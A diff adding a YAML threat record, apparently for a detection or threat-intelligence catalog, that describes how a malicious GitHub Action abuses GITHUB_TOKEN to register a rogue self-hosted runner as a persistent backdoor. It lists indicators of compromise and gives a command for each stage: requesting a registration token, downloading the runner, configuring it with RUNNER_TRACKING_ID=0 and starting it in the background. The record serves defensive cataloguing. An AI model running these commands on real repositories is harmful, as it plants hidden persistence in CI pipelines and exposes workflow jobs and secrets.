@@ -1,0 +1,83 @@
+name: Rogue Self-Hosted Runner Registration via GITHUB_TOKEN
+threat_actor: Malicious GitHub Action (projected Shai-Hulud / TeamPCP evolution)
+campaign: runner-abuse
+first_seen: 2025-11-24 (Shai-Hulud worm, mass exploitation)
+status: active
+
+summary: >
+  A malicious GitHub Action step uses the automatically-provided GITHUB_TOKEN to
+  request a runner registration token via the GitHub API, then downloads the
+  actions-runner binary and registers a self-hosted runner as a persistent backdoor.
+  The rogue runner communicates exclusively with github.com over HTTPS — fully
+  whitelisted by all standard network defenses. RUNNER_TRACKING_ID=0 prevents the
+  cleanup job from terminating the runner process, achieving persistence across
+  workflow runs. Demonstrated at scale by the Shai-Hulud worm (November 2025,
+  20,000+ repos, 1,700+ npm packages) and Sysdig research.
+
+attack_chain:
+  - stage: 1
+    name: Runner Registration Token Request via GitHub API
+    technique: T1528 (Steal Application Access Token), T1098 (Account Manipulation)
+    description: >
+      POSTs to the GitHub REST API runner registration endpoint using the workflow's
+      GITHUB_TOKEN. Returns a one-time registration token valid for 1 hour.
+      Requires only the default GITHUB_TOKEN with 'actions: write' scope — granted
+      by default in most repository configurations.
+    command: "curl -X POST -H 'Authorization: token $GITHUB_TOKEN' https://api.github.com/repos/{owner}/{repo}/actions/runners/registration-token"
+
+  - stage: 2
+    name: Actions Runner Binary Download
+    technique: T1105 (Ingress Tool Transfer)
+    description: >
+      Downloads the official actions-runner tarball from github.com/actions/runner
+      releases and extracts it to /tmp/. Using the official binary avoids detection
+      by hash-based scanners. The download destination /tmp/ is writable without
+      elevated privileges on all GitHub-hosted runner environments.
+    command: "curl -sL https://github.com/actions/runner/releases/download/v2.313.0/actions-runner-linux-x64.tar.gz -o /tmp/runner.tar.gz && tar -xzf /tmp/runner.tar.gz -C /tmp/runner/"
+
+  - stage: 3
+    name: Rogue Runner Configuration
+    technique: T1543 (Create or Modify System Process), T1036 (Masquerading)
+    description: >
+      Runs config.sh with the registration token and target repository URL to
+      register the runner. Sets RUNNER_TRACKING_ID=0 to prevent the runner cleanup
+      job from terminating the process after the current workflow completes — this
+      is the persistence mechanism. The runner appears in the repository's Settings
+      > Actions > Runners page as a legitimate runner.
+    command: "RUNNER_TRACKING_ID=0 ./config.sh --url https://github.com/{owner}/{repo} --token $REG_TOKEN --name backdoor-runner --unattended"
+
+  - stage: 4
+    name: Rogue Runner Started as Persistent Backdoor
+    technique: T1610 (Deploy Container), T1571 (Non-Standard Port)
+    description: >
+      Starts the rogue runner in the background. The runner polls github.com for
+      queued jobs over HTTPS (port 443) — traffic is indistinguishable from the
+      legitimate runner. Any workflow that targets 'runs-on: self-hosted' may be
+      intercepted by the rogue runner. All C2 communication flows through GitHub's
+      infrastructure.
+    command: "RUNNER_TRACKING_ID=0 ./run.sh &"
+
+iocs:
+  api_endpoints:
+    - "api.github.com/repos/*/actions/runners/registration-token"
+    - "github.com/actions/runner/releases/download/*/actions-runner-linux-*.tar.gz"
+  files:
+    - /tmp/actions-runner*.tar.gz
+    - /tmp/runner/config.sh
+    - /tmp/runner/run.sh
+    - /tmp/runner/.runner
+    - /tmp/runner/.credentials
+  env_vars:
+    - RUNNER_TRACKING_ID=0
+  process_names:
+    - Runner.Worker (rogue instance)
+    - Runner.Listener (rogue instance)
+  notes:
+    - "RUNNER_TRACKING_ID=0 is documented as the persistence mechanism — cleanup job skips process termination when this is set"
+    - "All runner C2 traffic goes to github.com:443 — whitelisted by default in all enterprise firewalls"
+
+references:
+  - https://www.sysdig.com/blog/how-threat-actors-are-using-self-hosted-github-actions-runners-as-backdoors
+  - https://github.com/step-security/harden-runner
+  - https://docs.github.com/en/actions/concepts/security/compromised-runners
+  - https://wellarchitected.github.com/library/application-security/recommendations/actions-security/
